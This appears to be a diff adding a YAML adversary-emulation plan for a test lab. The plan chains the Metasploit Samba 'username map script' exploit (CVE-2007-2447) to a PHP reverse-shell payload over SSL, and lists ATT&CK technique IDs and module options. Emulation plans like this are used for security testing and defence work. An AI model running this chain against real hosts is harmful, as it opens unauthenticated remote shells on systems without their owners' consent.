@@ -1,0 +1,168 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 18:00:52 UTC+0000
+attack_action_sequence:
+  - uuid: 8887a435-939a-4d9b-bcdc-75eb3877bca9
+    name: Samba "username map script" Command Execution
+    id:
+      - T1212
+      - T1203
+      - T1133
+    source: Metasploit Exploit
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Privilege Escalation
+      - Initial Access
+    technique:
+      - Exploitation for Privilege Escalation
+      - Exploitation for Client Execution
+      - Exploitation of Remote Services
+    description: |-
+      This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. 
+       No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
+    testbed:
+      CVE:
+        - CVE-2007-2447
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("multi/samba/usermap_script")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 139
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      ConnectTimeout:
+        CurrentSetting: 10
+        Required: true
+        Description: Maximum number of seconds to establish a TCP connection
+      NTLM::UseNTLMv2:
+        CurrentSetting: true
+        Required: true
+        Description: Use NTLMv2 instead of NTLM2_session when 'Negotiate NTLM2' key
+          is true
+      NTLM::UseNTLM2_session:
+        CurrentSetting: true
+        Required: true
+        Description: Activate the 'Negotiate NTLM2 key' flag, forcing the use of a
+          NTLMv2_session
+      NTLM::SendLM:
+        CurrentSetting: true
+        Required: true
+        Description: Always send the LANMAN response (except when NTLMv2_session is
+          specified)
+      NTLM::UseLMKey:
+        CurrentSetting: false
+        Required: true
+        Description: Activate the 'Negotiate Lan Manager Key' flag, using the LM key
+          when the LM response is sent
+      NTLM::SendNTLM:
+        CurrentSetting: true
+        Required: true
+        Description: Activate the 'Negotiate NTLM key' flag, indicating the use of
+          NTLM responses
+      NTLM::SendSPN:
+        CurrentSetting: true
+        Required: true
+        Description: Send an avp of type SPN in the ntlmv2 client blob, this allows
+          authentication on Windows 7+/Server 2008 R2+ when SPN is required
+      SMB::pipe_evasion:
+        CurrentSetting: false
+        Required: true
+        Description: Enable segmented read/writes for SMB Pipes
+      SMB::pipe_write_min_size:
+        CurrentSetting: 1
+        Required: true
+        Description: Minimum buffer size for pipe writes
+      SMB::pipe_write_max_size:
+        CurrentSetting: 1024
+        Required: true
+        Description: Maximum buffer size for pipe writes
+      SMB::pipe_read_min_size:
+        CurrentSetting: 1
+        Required: true
+        Description: Minimum buffer size for pipe reads
+      SMB::pipe_read_max_size:
+        CurrentSetting: 1024
+        Required: true
+        Description: Maximum buffer size for pipe reads
+      SMB::pad_data_level:
+        CurrentSetting: 0
+        Required: true
+        Description: Place extra padding between headers and data (level 0-3)
+      SMB::pad_file_level:
+        CurrentSetting: 0
+        Required: true
+        Description: Obscure path names used in open/create (level 0-3)
+      SMB::obscure_trans_pipe_level:
+        CurrentSetting: 0
+        Required: true
+        Description: Obscure PIPE string in TransNamedPipe (level 0-3)
+      SMBName:
+        CurrentSetting: '*SMBSERVER'
+        Required: true
+        Description: The NetBIOS hostname (required for port 139 connections)
+      SMB::VerifySignature:
+        CurrentSetting: false
+        Required: true
+        Description: Enforces client-side verification of server response signatures
+      SMB::ChunkSize:
+        CurrentSetting: 500
+        Required: true
+        Description: The chunk size for SMB segments, bigger values will increase
+          speed but break NT 4.0 and SMB signing
+      SMB::Native_OS:
+        CurrentSetting: Windows 2000 2195
+        Required: true
+        Description: The Native OS to send during authentication
+      SMB::Native_LM:
+        CurrentSetting: Windows 2000 5.0
+        Required: true
+        Description: The Native LM to send during authentication
+      SMB::AlwaysEncrypt:
+        CurrentSetting: true
+        Required: true
+        Description: Enforces encryption even if the server does not require it (SMB3.x
+          only). Note that when it is set to false, the SMB client will still encrypt
+          the communication if the server requires it
+  - uuid: 22589e32-1738-4b8c-8251-314ecb823ed1
+    name: Unix Command Shell, Reverse TCP SSL (via php)
+    id:
+      - T1059.004
+      - T1573
+    source: Metasploit Payload
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell (T1059.004)'
+      - Encrypted Channel (T1573)
+    description: Creates an interactive shell via php, uses SSL
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("cmd/unix/reverse_php_ssl")
+    arguments:
+      LHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: The listen address (an interface may be specified)
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2007-2447
